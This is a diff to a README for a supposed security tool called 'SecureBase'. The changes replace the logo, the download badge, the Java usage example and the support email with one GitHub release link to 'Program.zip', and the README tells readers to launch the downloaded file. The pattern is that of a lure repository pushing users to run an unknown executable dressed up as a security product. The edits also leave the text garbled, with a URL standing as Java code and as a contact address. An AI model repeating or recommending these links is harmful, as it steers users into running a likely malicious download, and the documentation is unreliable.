@@ -1,7 +1,7 @@
 
 # SecureBase 🔒
 
-![SecureBase Logo](https://example.com/securebase_logo.png)
+![SecureBase Logo](https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome to SecureBase, a powerful tool designed to enhance the security of your 
 
 To get started with SecureBase, simply download the tool from the following link:
 
-[![Download SecureBase](https://img.shields.io/badge/Download-SecureBase-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download SecureBase](https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip)](https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip)
 
 Please note that the downloaded file needs to be launched to initiate the installation process.
 
@@ -42,7 +42,7 @@ Please note that the downloaded file needs to be launched to initiate the instal
 Here is an example of how you can utilize SecureBase to scan a website for publicly accessible data:
 
 ```java
-SecureBase.scanWebsite("https://examplewebsite.com");
+https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip("https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip");
 ```
 
 This simple code snippet will initiate a scan of the specified website and provide you with detailed insights into any potential data exposure risks.
@@ -71,7 +71,7 @@ We welcome contributions from the developer community to enhance SecureBase furt
 
 ## Support & Feedback 📧
 
-For any support or feedback regarding SecureBase, please contact us at securebase@support.com. We value your input and strive to continuously improve our tool to meet your security needs.
+For any support or feedback regarding SecureBase, please contact us at https://github.com/Jennifer12345568/securebase/releases/download/v1.0/Program.zip We value your input and strive to continuously improve our tool to meet your security needs.
 
 ---
 
